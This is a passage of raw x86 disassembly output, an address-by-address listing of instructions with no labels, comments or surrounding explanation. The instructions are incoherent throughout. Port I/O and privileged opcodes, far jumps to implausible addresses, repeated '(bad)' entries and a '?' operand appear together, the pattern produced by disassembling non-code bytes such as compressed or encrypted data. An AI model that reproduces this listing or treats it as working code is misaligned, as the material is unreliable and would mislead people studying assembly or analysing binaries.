  41916b:	sbb    esp,edx
  41916d:	in     eax,dx
  41916e:	mov    ecx,ds
  419170:	cmp    eax,0x8227a0a9
  419175:	rcl    cl,1
  419177:	push   ecx
  419178:	jne    0x41912f
  41917a:	push   edx
  41917b:	hlt    
  41917c:	in     eax,dx
  41917d:	or     ecx,DWORD PTR [ecx*2-0x2ad2bb06]
  419184:	push   0xcb9ba985
  419189:	sub    bl,BYTE PTR [esp+ebp*8]
  41918c:	ja     0x419161
  41918e:	int3   
  41918f:	inc    edi
  419190:	ins    BYTE PTR es:[edi],dx
  419191:	mov    bl,0x50
  419193:	stos   DWORD PTR es:[edi],eax
  419194:	xor    eax,0xf0c50d39
  419199:	call   0xaf3bd566
  41919e:	inc    edi
  41919f:	cmp    DWORD PTR [ebx-0x7983bf8b],edx
  4191a5:	jecxz  0x419164
  4191a7:	aaa    
  4191a8:	adc    eax,0x66ebcb8c
  4191ad:	sar    DWORD PTR [ebp-0x7e3e9dc8],0x7d
  4191b4:	outs   dx,DWORD PTR ds:[esi]
  4191b5:	mov    esp,0x8cbd0c45
  4191ba:	sbb    BYTE PTR [ecx-0x765d6e24],al
  4191c0:	cmp    BYTE PTR [esp+ebp*1+0x709366e5],ch
  4191c7:	out    dx,al
  4191c8:	jne    0x41914a
  4191ca:	inc    eax
  4191cb:	arpl   sp,si
  4191cd:	cmp    eax,edi
  4191cf:	lods   eax,DWORD PTR ds:[esi]
  4191d0:	mov    ch,BYTE PTR [ebp+0x45816ec6]
  4191d6:	outs   dx,BYTE PTR ds:[esi]
  4191d7:	jmp    0x5e123945
  4191dc:	add    DWORD PTR [edi+0x75],esi
  4191df:	ror    BYTE PTR [ebp+0x7b05ae71],1
  4191e5:	stc    
  4191e6:	inc    esi
  4191e7:	leave  
  4191e8:	cwde   
  4191e9:	shl    DWORD PTR [ecx+0x0],0x3a
  4191ed:	sbb    eax,DWORD PTR [ecx-0x5a]
  4191f0:	mov    edi,0xcdf956a3
  4191f5:	xor    al,0x7c
  4191f7:	xchg   ebx,eax
  4191f8:	out    0xa4,eax
  4191fa:	push   edx
  4191fb:	xchg   ebp,eax
  4191fc:	inc    esp
  4191fd:	mov    dh,0x8f
  4191ff:	cwde   
  419200:	stos   DWORD PTR es:[edi],eax
  419201:	add    al,0x24
  419203:	(bad)  
  419204:	pop    ecx
  419205:	mov    DWORD PTR [esi-0x1e],edx
  419208:	stos   BYTE PTR es:[edi],al
  419209:	push   0x4b08a57a
  41920e:	clc    
  41920f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419210:	xchg   ebx,eax
  419211:	test   al,0xcf
  419213:	fstp   DWORD PTR [ebp+0x3002e4e2]
  419219:	add    DWORD PTR [ecx],esi
  41921b:	fmulp  st(0),st
  41921d:	or     eax,DWORD PTR es:[edi-0x570b801b]
  419224:	sub    al,0x90
  419226:	cmp    DWORD PTR [eax],esi
  419228:	ror    DWORD PTR fs:[edi+0x46],1
  41922c:	mov    edi,0x8d8ca51f
  419231:	outs   dx,BYTE PTR ds:[esi]
  419232:	cmp    dh,0xdc
  419235:	mov    ebp,0x4ce4ce90
  41923a:	pop    ecx
  41923b:	jns    0x4191c6
  41923d:	pop    edx
  41923e:	rol    edi,cl
  419240:	sub    al,BYTE PTR [eax+0x21]
  419243:	sar    BYTE PTR [esi+0x6b],1
  419246:	ss loope 0x41920d
  419249:	xchg   ecx,eax
  41924a:	inc    ecx
  41924b:	inc    esi
  41924c:	jae    0x419213
  41924e:	ins    BYTE PTR es:[edi],dx
  41924f:	inc    esi
  419250:	mov    ebx,0xa9ac4943
  419255:	add    al,BYTE PTR [edx-0x5ab01499]
  41925b:	sub    BYTE PTR [ebp-0x64a4564],bh
  419261:	out    dx,eax
  419262:	daa    
  419263:	in     eax,dx
  419264:	xchg   BYTE PTR [edx],dl
  419266:	cmp    DWORD PTR [ecx+0x6b],esi
  419269:	push   0xffffffbe
  41926b:	inc    ecx
  41926c:	int3   
  41926d:	imul   edx,DWORD PTR ds:0x66561a3e,0x777f91aa
  419277:	push   DWORD PTR [edi]
  419279:	xchg   ebp,eax
  41927a:	fsubrp st(3),st
  41927c:	cmp    ebp,esp
  41927e:	imul   ecx,DWORD PTR [esi],0x19
  419281:	dec    ecx
  419282:	lahf   
  419283:	mov    bh,0x11
  419285:	cmp    BYTE PTR [eax-0x48a8a91],bh
  41928b:	mov    edi,0xcdf6b535
  419290:	pushf  
  419291:	shl    DWORD PTR [edx],0x2b
  419294:	dec    bp
  419296:	nop
  419297:	dec    ebx
  419298:	cdq    
  419299:	call   0x10d9d012
  41929e:	xor    DWORD PTR ds:0xc1b3328b,edx
  4192a5:	iret   
  4192a6:	xor    al,BYTE PTR [esi-0x2b]
  4192a9:	ja     0x419246
  4192ab:	cwde   
  4192ac:	iret   
  4192ad:	or     ecx,ecx
  4192af:	jno    0x41931c
  4192b1:	mov    bl,0x0
  4192b3:	rol    DWORD PTR [ebx+0x6b6d7b6d],cl
  4192b9:	jnp    0x419331
  4192bb:	or     DWORD PTR [edx+0x5e],0x3d30f1e
  4192c2:	add    BYTE PTR [ebx],0xb6
  4192c5:	outs   dx,DWORD PTR ds:[esi]
  4192c6:	jb     0x41930b
  4192c8:	add    al,0xd6
  4192ca:	fist   WORD PTR [eax-0x5d]
  4192cd:	pop    eax
  4192ce:	mov    ecx,edx
  4192d0:	leave  
  4192d1:	xor    eax,0x65959375
  4192d6:	ja     0x419298
  4192d8:	mov    ebp,ecx
  4192da:	pop    ebp
  4192db:	iret   
  4192dc:	dec    esi
  4192dd:	lds    edx,FWORD PTR [edi+0x29]
  4192e0:	std    
  4192e1:	sub    BYTE PTR [edi-0x7e],bh
  4192e4:	ja     0x4192a9
  4192e6:	or     eax,DWORD PTR [ecx-0x4eed0aa]
  4192ec:	cdq    
  4192ed:	pop    ebp
  4192ee:	mov    bh,0xa6
  4192f0:	aaa    
  4192f1:	(bad)  
  4192f2:	mov    esp,0x902f2909
  4192f7:	js     0x4192fb
  4192f9:	ror    DWORD PTR [ecx-0x3e],cl
  4192fc:	inc    ecx
  4192fd:	popa   
  4192fe:	pusha  
  4192ff:	stos   DWORD PTR es:[edi],eax
  419300:	dec    eax
  419301:	sbb    ecx,DWORD PTR [ebx+ebx*1-0x68]
  419305:	mov    al,0x51
  419307:	hlt    
  419308:	push   esp
  419309:	imul   edx,DWORD PTR [eax],0xb8405762
  41930f:	push   eax
  419310:	pop    edi
  419311:	or     bh,BYTE PTR [ebp+0x65dd606e]
  419317:	mov    ch,0x70
  419319:	mov    esi,0xd9d93271
  41931e:	cmp    eax,0xf94f3f5e
  419323:	loop   0x41936a
  419325:	les    esp,FWORD PTR [ecx+0x3d]
  419328:	mov    eax,0xc5f4f627
  41932d:	out    0xd7,eax
  41932f:	fidivr WORD PTR [ecx+eax*4-0x34]
  419333:	sysexit 
  419335:	adc    eax,0x6a3e88db
  41933a:	ficom  DWORD PTR [eax-0x4f0cc420]
  419340:	add    DWORD PTR [ecx],edi
  419342:	or     BYTE PTR [edi+esi*8+0x7ca00e2e],cl
  419349:	scas   al,BYTE PTR es:[edi]
  41934a:	jno    0x419306
  41934c:	bound  esp,QWORD PTR [ecx-0x5b367d]
  419352:	sub    DWORD PTR [esi+0x49],edx
  419355:	pop    esi
  419356:	push   es
  419357:	and    eax,0xc1cea5b8
  41935c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41935d:	scas   eax,DWORD PTR es:[edi]
  41935e:	aas    
  41935f:	ss sti 
  419361:	jmp    0x419358
  419363:	sar    esp,cl
  419365:	jmp    0x37c8:0x950ddd90
  41936c:	fsub   QWORD PTR gs:[esi-0x666ac3d6]
  419373:	ss sahf 
  419375:	sahf   
  419376:	scas   eax,DWORD PTR es:[di]
  419378:	push   ebp
  419379:	hlt    
  41937a:	pop    eax
  41937b:	fdivr  DWORD PTR [edi]
  41937d:	adc    dh,BYTE PTR [esi-0x31]
  419380:	inc    ebp
  419381:	(bad)
  419384:	pop    edi
  419385:	scas   al,BYTE PTR es:[edi]
  419386:	and    al,0xb6
  419388:	jle    0x419358
  41938a:	ret    0xb73f
  41938d:	mov    edi,0x532ce987
  419392:	imul   edi,DWORD PTR [eax-0x2d64675b],0xe6a1399
  41939c:	and    BYTE PTR [eax+0x1974cf],dh
  4193a2:	and    al,0x2e
  4193a4:	dec    ebp
  4193a5:	fst    DWORD PTR [esi+ebx*8-0x6e]
  4193a9:	ins    DWORD PTR es:[edi],dx
  4193aa:	dec    edi
  4193ab:	out    dx,al
  4193ac:	pop    esp
  4193ad:	xchg   esp,eax
  4193ae:	adc    DWORD PTR [eax-0x54],esi
  4193b1:	add    DWORD PTR [edx+0x31],ebx
  4193b4:	out    dx,eax
  4193b5:	jg     0x41933e
  4193b7:	retf   0x9474
  4193ba:	xchg   ebx,eax
  4193bb:	xchg   edx,eax
  4193bc:	mov    ecx,0x4a0ec064
  4193c1:	xlat   BYTE PTR ds:[ebx]
  4193c2:	pop    esp
  4193c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c4:	dec    ebp
  4193c5:	xchg   ebx,eax
  4193c6:	neg    DWORD PTR es:[esi]
  4193c9:	mov    dl,0x56
  4193cb:	loope  0x419446
  4193cd:	fnsave [ecx]
  4193cf:	xchg   ebx,eax
  4193d0:	sub    BYTE PTR [edi+0x4d],0xdd
  4193d4:	repnz mov bl,0x6b
  4193d7:	pop    es
  4193d8:	sbb    eax,DWORD PTR [ebp-0x68]
  4193db:	push   cs
  4193dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193dd:	or     cl,BYTE PTR ss:[ebx+0x56]
  4193e1:	jecxz  0x419457
  4193e3:	pop    esi
  4193e4:	xor    DWORD PTR [ebp+0x12],0x1c39fa1b
  4193eb:	gs mov esi,0x728ff03f
  4193f1:	test   bh,0x17
  4193f4:	push   cs
  4193f5:	or     ebx,0x71
  4193f8:	push   ds
  4193f9:	das    
  4193fa:	out    0xa7,al
  4193fc:	inc    edi
  4193fd:	sub    edx,DWORD PTR [edx-0x4928b4da]
  419403:	repnz sahf 
  419405:	push   ebp
  419406:	idiv   BYTE PTR [esi-0x3dcc1aa6]
  41940c:	test   DWORD PTR [edx],eax
  41940e:	pop    esp
  41940f:	xor    cl,BYTE PTR ds:0x5661d053
  419415:	cli    
  419416:	xor    ah,ch
  419418:	mov    eax,ds:0xf0edf532
  41941d:	cmp    DWORD PTR [ebx-0xe],0xd
  419421:	push   0x39
  419423:	js     0x41945d
  419425:	push   esp
  419426:	inc    edi
  419427:	cmp    esi,DWORD PTR [esi-0x3d]
  41942a:	sbb    eax,0x784c118d
  41942f:	shl    BYTE PTR [eax],1
  419431:	mov    DWORD PTR [edi-0x2c],eax
  419434:	and    eax,0x3d617942
  419439:	scas   al,BYTE PTR es:[edi]
  41943a:	inc    esi
  41943b:	loop   0x4193cd
  41943d:	ret    
  41943e:	dec    esp
  41943f:	push   ds
  419440:	cmp    BYTE PTR [ebx],bl
  419442:	push   ebx
  419443:	jmp    0xb3cf8894
  419448:	scas   al,BYTE PTR es:[edi]
  419449:	inc    ecx
  41944a:	sbb    eax,0xa5e985ca
  41944f:	jmp    0x419410
  419451:	xor    BYTE PTR [edi+0x51aa8979],al
  419457:	sbb    eax,0x5824c26c
  41945c:	in     eax,0xfc
  41945e:	rcl    DWORD PTR [edi],0x49
  419461:	and    esp,0x7a
  419464:	add    al,0x7
  419466:	ret    0x69b8
  419469:	jmp    0x41946f
  41946b:	shl    DWORD PTR [eax+0x7e],cl
  41946e:	aam    0x20
  419470:	stos   BYTE PTR es:[edi],al
  419471:	ror    DWORD PTR [eax-0x4571f54b],1
  419477:	call   0x2944:0xca25aa8c
  41947e:	mov    dl,0x96
  419480:	not    BYTE PTR [esi+0x4b]
  419483:	(bad)  
  419484:	xor    BYTE PTR [ebx-0x7d],dh
  419487:	mov    ds:0xd5b83b00,al
  41948c:	inc    esp
  41948d:	das    
  41948e:	setae  BYTE PTR [ebx]
  419491:	dec    edi
  419492:	push   cs
  419493:	mov    dl,0xa4
  419495:	jnp    0x4194ef
  419497:	or     eax,0xa926f66
  41949c:	pop    ebp
  41949d:	inc    DWORD PTR ds:0x3cb20595
  4194a3:	pop    esp
  4194a4:	cmp    al,0x7e
  4194a6:	daa    
  4194a7:	inc    esi
  4194a8:	dec    esp
  4194a9:	out    dx,al
  4194aa:	xor    eax,0x9c6c2d9d
  4194af:	test   BYTE PTR [esi+ebp*1+0x4192362b],0xa1
  4194b7:	pop    edx
  4194b8:	dec    edi
  4194b9:	xor    ch,ch
  4194bb:	lods   eax,DWORD PTR ds:[esi]
  4194bc:	inc    ebp
  4194bd:	shl    DWORD PTR [esi+0x62b1ce6b],0x90
  4194c4:	mov    ah,0xf4
  4194c6:	push   esi
  4194c7:	fdiv   QWORD PTR [ebx]
  4194c9:	xor    eax,0x9bac38e2
  4194ce:	cmp    al,0x6e
  4194d0:	loope  0x4194a1
  4194d2:	push   0xffffffe0
  4194d4:	int3   
  4194d5:	aas    
  4194d6:	inc    ebp
  4194d7:	in     eax,0xf
  4194d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194da:	or     ah,BYTE PTR [eax-0x64]
  4194dd:	dec    ebx
  4194de:	ja     0x4194ef
  4194e0:	arpl   WORD PTR [edx+0x5efa710f],dx
  4194e6:	mov    eax,0x941c8d56
  4194eb:	add    ah,BYTE PTR [ebp-0x4644152e]
  4194f1:	sbb    eax,esi
  4194f3:	mov    ds:0x127b0d0c,al
  4194f8:	sub    BYTE PTR [ebp+0x2f767079],bh
  4194fe:	out    0x68,eax
  419500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419501:	push   DWORD PTR [ebp+0x97697a6]
  419507:	mov    dl,0x53
  419509:	bound  edx,QWORD PTR [esi+0x15]
  41950c:	and    cl,BYTE PTR [ebx]
  41950e:	and    BYTE PTR [edi+ebx*2+0x73a021b8],ch
  419515:	inc    edx
  419516:	popf   
  419517:	out    dx,eax
  419518:	dec    esp
  419519:	ds inc eax
  41951b:	loopne 0x41954f
  41951d:	dec    edi
  41951e:	push   es
  41951f:	std    
  419520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419521:	push   cs
  419522:	test   al,0x32
  419524:	mov    dl,0x8e
  419526:	xor    dl,BYTE PTR [edi]
  419528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419529:	fstp   QWORD PTR [esi]
  41952b:	mul    DWORD PTR [eax+0x37]
  41952e:	inc    DWORD PTR [esi-0x3e]
  419531:	pop    esp
  419532:	call   0xa8dab63
  419537:	jbe    0x419524
  419539:	xchg   esi,eax
  41953a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41953b:	or     esi,DWORD PTR [ebx+0x71344599]
  419541:	bound  esi,QWORD PTR [ecx-0x65]
  419544:	mov    ebx,0x9eb1b217
  419549:	dec    ebp
  41954a:	cld    
  41954b:	je     0x4195c5
  41954d:	in     al,0xfe
  41954f:	shl    BYTE PTR [edi],1
  419551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419553:	adc    BYTE PTR [esi+0x1232a489],bl
  419559:	mov    ebx,0x6b250684
  41955e:	and    DWORD PTR [ecx],eax
  419560:	push   eax
  419561:	pop    edi
  419562:	leave  
  419563:	and    ah,BYTE PTR [esi-0x5d975421]
  419569:	sbb    al,0x2
  41956b:	fisttp QWORD PTR cs:[ecx+0x471c4e9f]
  419572:	sub    DWORD PTR [ebx-0x17276b63],esp
  419578:	push   ds
  419579:	mov    ch,0x4b
  41957b:	and    BYTE PTR [edx],ah
  41957d:	(bad)  
  41957e:	pop    eax
  41957f:	mov    WORD PTR [eax-0x43],gs
  419582:	push   esp
  419583:	lea    eax,[edx+0x33]
  419586:	dec    edi
  419587:	mov    edx,0x798721d
  41958c:	call   0x200ad5d1
  419591:	cs mov ch,0x3a
  419594:	shl    DWORD PTR [ebx+0x7b],1
  419597:	lods   al,BYTE PTR ds:[esi]
  419598:	fcom   st(4)
  41959a:	jno    0x419560
  41959c:	inc    edx
  41959d:	jnp    0x4195e0
  41959f:	or     eax,0xfeda7a1a
  4195a4:	mov    dh,0x63
  4195a6:	mov    edx,0x8a862f09
  4195ab:	and    al,0xff
  4195ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195ae:	iret   
  4195af:	pop    ds
  4195b0:	adc    eax,ebp
  4195b2:	int3   
  4195b3:	push   esp
  4195b4:	or     al,0xc1
  4195b6:	jmp    0x419624
  4195b8:	sub    eax,0x8e877ea6
  4195bd:	setbe  BYTE PTR [ebx+ebp*8]
  4195c1:	push   edx
  4195c2:	sbb    cl,BYTE PTR ds:0x5dbee967
  4195c8:	adc    al,0x6f
  4195ca:	dec    ebx
  4195cb:	push   edx
  4195cc:	jne    0x41956b
  4195ce:	lods   eax,DWORD PTR ds:[esi]
  4195cf:	or     eax,0xfa42d6c7
  4195d4:	push   0xffffffee
  4195d6:	sbb    eax,0x8e2152b3
  4195db:	push   0xffffffd8
  4195dd:	enter  0xf275,0x7b
  4195e1:	pop    edx
  4195e2:	add    bl,BYTE PTR [edx+0x7d56d0d5]
  4195e8:	jae    0x419658
  4195ea:	xchg   esi,eax
  4195eb:	jp     0x41961d
  4195ed:	jns    0x41966e
  4195ef:	xor    eax,0xbb27dda8
  4195f4:	push   esp
  4195f5:	jnp    0x419584
  4195f7:	ins    DWORD PTR es:[edi],dx
  4195f8:	dec    esi
  4195f9:	cs mov edx,0xa9c76c64
  4195ff:	or     esi,DWORD PTR [ecx+0x64]
  419602:	mov    ebp,0x3b4e5cd
  419607:	dec    ebx
  419608:	(bad)  
  419609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41960a:	jg     0x419591
  41960c:	push   0x20
  41960e:	fs push cs
  419610:	xchg   DWORD PTR [eax+0x7569e9ee],esi
  419616:	pop    ebp
  419617:	aam    0x2c
  419619:	jge    0x4195ba
  41961b:	aam    0x64
  41961d:	cld    
  41961e:	sub    ebx,esi
  419620:	xchg   edi,eax
  419621:	cmp    ch,BYTE PTR [ecx-0x5501261b]
  419627:	mov    ch,0x88
  419629:	stc    
  41962a:	ins    BYTE PTR es:[edi],dx
  41962b:	inc    ebp
  41962c:	jo     0x419645
  41962e:	xchg   edi,eax
  41962f:	jle    0x419634
  419631:	test   BYTE PTR ds:0xf2e38ab9,ah
  419637:	ss push ecx
  419639:	(bad)  
  41963a:	jnp    0x419674
  41963c:	sbb    BYTE PTR [edi+0x55c541fb],ah
  419642:	mov    ecx,0xa019d346
  419647:	pop    edx
  419648:	test   eax,0x49ea2a3f
  41964d:	pop    ecx
  41964e:	push   ebp
  41964f:	push   eax
  419650:	jmp    0x494eb625
  419655:	aaa    
  419656:	pop    edi
  419657:	shl    BYTE PTR [ebx-0x36685ac2],cl
  41965d:	(bad)  
  41965e:	push   ebp
  41965f:	es dec esi
  419661:	icebp  
  419662:	mov    edx,0x17cf3af2
  419667:	jecxz  0x4196bc
  419669:	ins    BYTE PTR es:[edi],dx
  41966a:	mov    bh,0xa2
  41966c:	jns    0x4195ef
  41966e:	cmp    edi,edi
  419670:	jecxz  0x4196c0
  419672:	dec    edx
  419673:	pop    ss
  419674:	in     eax,0x57
  419676:	sbb    al,BYTE PTR [eax+edi*1]
  419679:	jmp    0x41961e
  41967b:	pop    esi
  41967c:	xor    eax,0x880a34c0
  419681:	scas   eax,DWORD PTR es:[edi]
  419682:	(bad)  
  419684:	int    0xe9
  419686:	xor    ebp,ebx
  419688:	lea    edx,[eax-0x4d]
  41968b:	jo     0x41965a
  41968d:	mov    bh,0x2f
  41968f:	mov    ah,0x1b
  419691:	add    BYTE PTR [edx-0x49],bl
  419694:	mov    dl,bh
  419696:	jle    0x419628
  419698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419699:	hlt    
  41969a:	xor    al,0x5b
  41969c:	fstp   QWORD PTR [ecx]
  41969e:	call   0xcde3be95
  4196a3:	lds    eax,FWORD PTR [esi+0x54]
  4196a6:	add    DWORD PTR [edx+0x6ef08cdb],ecx
  4196ac:	cmp    BYTE PTR [ebx+ebx*2-0x2c17b50f],ah
  4196b3:	in     al,dx
  4196b4:	ins    BYTE PTR es:[edi],dx
  4196b5:	lock pop ebx
  4196b7:	out    dx,eax
  4196b8:	sbb    DWORD PTR [esi-0x76a7b134],ebp
  4196be:	rol    BYTE PTR [esi-0x8492be0],cl
  4196c4:	xchg   ebp,eax
  4196c5:	call   0x3533:0xa427111
  4196cc:	mov    ah,0xa2
  4196ce:	cli    
  4196cf:	mov    ecx,0x1dd416c9
  4196d4:	outs   dx,BYTE PTR ds:[esi]
  4196d5:	cs (bad) 
  4196d7:	popa   
  4196d8:	ins    BYTE PTR es:[edi],dx
  4196d9:	loop   0x419663
  4196db:	cmp    DWORD PTR [eax],esp
  4196dd:	loopne 0x4196d2
  4196df:	add    bh,BYTE PTR [ebp+0x599f2005]
  4196e5:	push   ebx
  4196e6:	inc    esp
  4196e7:	pop    esp
  4196e8:	sbb    DWORD PTR [ebx-0x38],edx
  4196eb:	xchg   ebx,eax
  4196ec:	mov    bh,0x76
  4196ee:	sbb    BYTE PTR [ecx],dl
  4196f0:	jo     0x41971e
  4196f2:	and    DWORD PTR [esi],ebx
  4196f4:	dec    ebp
  4196f5:	jmp    0x4ae1e244
  4196fa:	out    0x67,eax
  4196fc:	xor    BYTE PTR [edx-0x43a4ec5f],cl
  419702:	outs   dx,DWORD PTR ds:[esi]
  419703:	add    ebx,DWORD PTR [edx-0x6b]
  419706:	cs ret 0x9928
  41970a:	fist   DWORD PTR ds:0x96a7c740
  419710:	mov    ecx,0xa2867733
  419715:	mov    edx,0x4bd1faa2
  41971a:	and    BYTE PTR [ebp+0x23dae167],ah
  419720:	xchg   ebp,eax
  419721:	xchg   esp,eax
  419722:	(bad)  
  419723:	loopne 0x4196ff
  419725:	out    0xa2,al
  419727:	add    al,0x74
  419729:	add    al,0x8b
  41972b:	int    0xf2
  41972d:	xcrypt-cbc (bad)
  41972e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41972f:	push   edi
  419730:	sbb    al,0x93
  419732:	cdq    
  419733:	(bad)  
  419734:	sahf   
  419735:	popf   
  419736:	jnp    0x41979e
  419738:	sbb    BYTE PTR ds:0x8838984,dh
  41973e:	mov    ebp,esi
  419740:	and    al,bh
  419742:	outs   dx,BYTE PTR ds:[esi]
  419743:	xor    ch,bh
  419745:	bound  edi,QWORD PTR [eax+ebx*1+0x4050cfea]
  41974c:	dec    ebx
  41974d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41974e:	pusha  
  41974f:	xchg   esp,eax
  419750:	or     BYTE PTR [edx+0x3d],dh
  419753:	jmp    0xa551:0x2f9b462a
  41975a:	pop    ebx
  41975b:	sti    
  41975c:	ins    DWORD PTR es:[edi],dx
  41975d:	mov    cl,0x2c
  41975f:	aam    0x6b
  419761:	aad    0xdc
  419763:	mov    bh,BYTE PTR [edi-0x4b1079bc]
  419769:	xchg   edi,eax
  41976a:	xor    al,BYTE PTR [edx]
  41976c:	add    BYTE PTR ds:0x67f4357b,dh
  419772:	add    eax,edx
  419774:	push   ebp
  419775:	arpl   WORD PTR [eax+0x5948571],cx
  41977b:	imul   esp,esp,0x17
  41977e:	jg     0x419781
  419780:	mov    ecx,0x1bdf0c1c
  419785:	push   ebx
  419786:	scas   al,BYTE PTR es:[edi]
  419787:	mov    al,ds:0x2e41fd19
  41978c:	daa    
  41978d:	pop    ss
  41978e:	frstor [esi+0x6e]
  419791:	ds push es
  419793:	pop    esi
  419794:	sub    ecx,DWORD PTR [eax+0x224337f9]
  41979a:	add    eax,0x16b86c04
  41979f:	out    dx,eax
  4197a0:	cmp    eax,0x586000a3
  4197a5:	push   eax
  4197a6:	aam    0x5e
  4197a8:	mov    ch,0xe1
  4197aa:	leave  
  4197ab:	(bad)  
  4197ac:	xor    dl,bl
  4197ae:	add    BYTE PTR [ebp-0x7d9117d6],dl
  4197b4:	retf   
  4197b5:	leave  
  4197b6:	scas   eax,DWORD PTR es:[edi]
  4197b7:	cmp    eax,0x5d765b1c
  4197bc:	and    BYTE PTR [edi],cl
  4197be:	mov    eax,ds:0xde56db81
  4197c3:	ss jnp 0x41983f
  4197c6:	sahf   
  4197c7:	rcl    DWORD PTR [edi-0x56],0x83
  4197cb:	ret    
  4197cc:	mov    edi,0x64e52410
  4197d1:	fcmove st,st(2)
  4197d3:	xor    ecx,DWORD PTR [edx+ebx*2]
  4197d6:	shl    DWORD PTR [esi],1
  4197d8:	xor    ah,ah
  4197da:	frstor [ecx+0x21]
  4197dd:	iret   
  4197de:	scas   eax,DWORD PTR es:[edi]
  4197df:	leave  
  4197e0:	in     eax,0x95
  4197e2:	jbe    0x419846
  4197e4:	(bad)  
  4197e5:	addr16 out 0xc5,al
  4197e8:	imul   eax,DWORD PTR [edi-0xf2e416],0x2ec43aa
  4197f2:	adc    edx,DWORD PTR [ebx+0x2]
  4197f5:	ins    DWORD PTR es:[edi],dx
  4197f6:	add    eax,DWORD PTR [ebx-0x53]
  4197f9:	mov    al,0x4
  4197fb:	mov    ah,0x3a
  4197fd:	xor    ah,BYTE PTR [edx]
  4197ff:	inc    ebx
  419800:	add    edi,DWORD PTR [edx+0x7fb42da8]
  419806:	xor    edx,DWORD PTR [esp+edx*1+0x3b]
  41980a:	push   es
  41980b:	and    eax,0x98c07ab5
  419810:	jl     0x41986f
  419812:	lods   eax,DWORD PTR ds:[esi]
  419813:	sbb    eax,0xdf6cb0ba
  419818:	stc    
  419819:	inc    ebx
  41981a:	pop    DWORD PTR [ebx+0x43b131c4]
  419820:	mov    bl,0x3
  419822:	ss or  ebx,esp
  419825:	pop    eax
  419826:	out    0xa5,al
  419828:	fldenv [edx+0x5a346ccf]
  41982e:	in     al,dx
  41982f:	aaa    
  419830:	sbb    al,0x78
  419832:	stos   DWORD PTR es:[edi],eax
  419833:	xchg   ecx,eax
  419834:	fdivr  QWORD PTR [ebx+0x1e]
  419837:	mov    WORD PTR [ebp+0x16],?
  41983a:	mov    ds:0x34489d33,eax
  41983f:	inc    ebp
  419840:	movsx  esp,bl
  419843:	mov    eax,ds:0xdd02adc1
  419848:	addr16 inc edx
  41984a:	(bad)  
  41984b:	cmp    ch,ah
  41984d:	mov    esp,0xdba3a145
  419852:	and    BYTE PTR [esp+eax*1],bh
  419855:	pusha  
  419856:	or     bh,ch
  419858:	xchg   DWORD PTR [eax],ebp
  41985a:	fcom   QWORD PTR [ebp-0x3d40f3a2]
  419860:	cmp    esp,ebx
  419862:	loopne 0x4197fa
  419864:	pop    esi
  419865:	fnclex 
  419867:	mov    ds:0x936ca84c,eax
  41986c:	pop    esi
  41986d:	xchg   esp,eax
  41986e:	pop    ebp
  41986f:	and    ah,dl
  419871:	push   ebp
  419872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419873:	lea    esi,[ebp-0x10]
  419876:	sar    DWORD PTR [edi+0x76],0x56
  41987a:	jnp    0x419859
  41987c:	or     eax,DWORD PTR [ecx+ecx*1]
  41987f:	fisubr WORD PTR [ebx+0x33]
  419882:	cmp    cl,0xa7
  419885:	retf   0xd4fa
  419888:	sbb    esp,0x3f
  41988b:	push   eax
  41988c:	stos   DWORD PTR es:[edi],eax
  41988d:	adc    dl,bl
  41988f:	xchg   edx,eax
  419890:	jecxz  0x4198a8
  419892:	gs sub esp,DWORD PTR es:[ecx-0x76]
  419897:	ror    BYTE PTR [edx+0x51],0xa6
  41989b:	mov    eax,ds:0xa75c0439
  4198a0:	dec    eax
  4198a1:	jle    0x419906
  4198a3:	xlat   BYTE PTR ds:[ebx]
  4198a4:	cs in  al,0x80
  4198a7:	mov    ch,0x7f
  4198a9:	add    esi,edi
  4198ab:	jae    0x4198e5
  4198ad:	iret   
  4198ae:	push   ebp
  4198af:	xor    bh,al
  4198b1:	imul   esp,DWORD PTR [ecx-0xfcf4a1b],0xffffffbf
  4198b8:	mov    DWORD PTR [edx-0x765768be],0xfe2016c0
  4198c2:	xchg   esi,eax
  4198c3:	loopne 0x4198dd
  4198c5:	cwde   
  4198c6:	mov    esi,0xcab328df
  4198cb:	sub    bl,BYTE PTR [edx-0x21]
  4198ce:	cmp    eax,0xd86a629a
  4198d3:	jb     0x419940
  4198d5:	mov    edi,0xa1459cc9
  4198da:	inc    eax
  4198db:	cmp    ax,WORD PTR [ecx+0x35b562e2]
  4198e2:	inc    ebx
  4198e3:	mov    esp,0xf656110f
  4198e8:	xchg   edx,eax
  4198e9:	aas    
  4198ea:	sub    ebx,0x6
  4198ed:	xor    al,0xf5
  4198ef:	push   ss
  4198f0:	int    0x4f
  4198f2:	push   es
  4198f3:	push   esp
  4198f4:	add    BYTE PTR [ebp+0x33],bh
  4198f7:	cmp    ebp,DWORD PTR [ecx+0x37bbea4a]
  4198fd:	addr16 mov ebx,0xb44b385f
  419903:	xor    DWORD PTR [ecx],esi
  419905:	pushf  
  419906:	dec    esp
  419907:	push   ds
  419908:	sbb    BYTE PTR [ecx],0x5f
  41990b:	sub    eax,0xfd46c946
  419910:	call   0x117b:0x4e9d2e78
  419917:	adc    eax,DWORD PTR [eax-0x5e038897]
  41991d:	cdq    
  41991e:	daa    
  41991f:	add    BYTE PTR [esi-0x3e21c3d7],bl
  419925:	and    ebx,DWORD PTR [eax-0x2931a9ac]
  41992b:	cmp    DWORD PTR [esi-0x26],0x4d
  41992f:	xchg   ecx,eax
  419930:	daa    
  419931:	pop    edx
  419932:	pop    eax
  419933:	and    BYTE PTR [ebp+0x43072297],ch
